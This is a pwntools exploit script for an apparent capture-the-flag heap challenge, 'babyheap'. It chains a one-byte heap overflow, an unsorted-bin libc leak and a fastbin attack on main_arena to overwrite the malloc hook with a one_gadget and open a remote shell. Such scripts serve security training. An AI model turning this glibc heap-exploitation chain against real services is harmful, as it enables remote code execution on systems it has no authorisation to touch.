#!/usr/bin/env python
from pwn import *
import re
			 
context.arch = 'amd64'
# libc = ELF('./libc.so.6')
if len(sys.argv) < 2:
	p = process('./babyheap')   
	context.log_level = 'debug'
	
else:   
	p = remote(sys.argv[1], int(sys.argv[2]))
	# context.log_level = 'debug'

def  alloc(size,nowait=False):	
	p.recvuntil('Command: ')
	p.sendline('1')	
	p.recvuntil('Size: ')		
	p.sendline(str(size))
	
	if nowait:
		return
	res = p.recvuntil('Allocated\n')
	# print "alloc chunk:"
	# print int(res.split()[1])
	return int(res.split()[1])
	 
def  update(idx,content,size=0):
	size = size if size else len(content)
	content = content.ljust(size,"\x00")	
	p.recvuntil('Command: ')
	p.sendline('2')
	p.recvuntil('Index: ')
	# print "update chunk:"
	# print str(idx)
	p.sendline(str(idx))
	p.recvuntil('Size: ')
	p.sendline(str(size))
	p.recvuntil('Content: ')
	p.sendline(content)
	
def  delete(idx):
	p.recvuntil('Command: ')
	p.sendline('3')
	p.recvuntil('Index: ')
	# print "delete chunk"
	# print str(idx)
	p.sendline(str(idx))	

def view(idx):
	p.recvuntil('Command: ')
	p.sendline('4')
	p.recvuntil('Index: ')
	# print "view chunk"
	# print str(idx)
	p.sendline(str(idx))
	p.recvuntil(']: ')
	return p.recvuntil('1. Allocate')

def exp(): 
	# create(0x18)
	# create(0x10)
	# create(0x10)
	# update(0,25,'A'*24+'\x41')
	# # gdb.attach(p)
	# delete(2)
	# # delete(0)	
	# delete(1)
	# create(0x30)
	# update(1,0x30,'A'*16+p64(0)+p64(0x21)+'\x00'*16)
	# create(0x10)
	# # create(0x10)
	# delete(0)
	# delete(2)
	# view(1)
	# p.recvuntil(']: ')
	# res = p.recv(48)[32:40]
	# heap_base = u64(res)
	meh  = alloc(0x10)
	ovf  = alloc(0x28)
	vic  = alloc(0x20)
	fake = alloc(0x20)
	alloc(0x20)
	update(ovf,'a'*0x28 + chr(0x51))
	update(fake,p64(-1,sign='signed')+p64(-1,sign='signed')+p64(0)+p64(0x21))	
	delete(vic)
	bigass = alloc(0x40)
	update(bigass,'a'*0x20 + p64(0)+p64(0x21))

	delete(meh)
	delete(fake)
	heap = u64(view(bigass)[0x30:][:8])
	log.info('[*]heap address:'+hex(heap))
	fake = alloc(0x10)
	
	update(bigass,'a'*0x20 + p64(0)+p64(0xd1))  #change fake size to 0xd1
	
	alloc(88,nowait=True)
	xx = alloc(88)
	update(xx,p64(0)+p64(0x21)+p64(0)+p64(0)+p64(0)+p64(0x21))  
	
	delete(fake)   # free small chunk,add to unsort bins,  fd bk point to  unsort bins addr.
	
	main_arena = u64(view(bigass)[0x30:][:8]) - 88     #compute main_arena addr
	log.info('[*]main_arena address:'+hex(main_arena))
	libc = main_arena -0x399b00
	log.info('[*]libc address:'+hex(libc))
	alloc(0x10,nowait=True)
	
	
	fake_chunk2 = main_arena - 0x33
	fake_chunk  = main_arena + 32 + 5 
	fake = alloc(0x48)
	
	xx = alloc(0x58)
	
	delete(xx)
	# gdb.attach(p)
	raw_input('x')
	delete(fake)
	raw_input('x')
	update(bigass,'a'*0x20 + p64(0)+p64(0x51)+p64(fake_chunk))
	print hex(fake_chunk),hex(fake_chunk2)
	raw_input('x')
	alloc(0x48)

	arena = alloc(0x48)
	print arena
	update(arena,"\x00"*3 + "\x00"*32 + p64(fake_chunk2))
	winit = alloc(0x48)
	update(winit,"\x00"*3 + "\x00"*16 + p64(libc + 0x3f35a))
	raw_input('x')
	alloc(0x10,nowait=True)
    
	log.info('[*]get shell!!!')
		
	p.interactive()
	p.close()

if __name__ == '__main__':
	exp()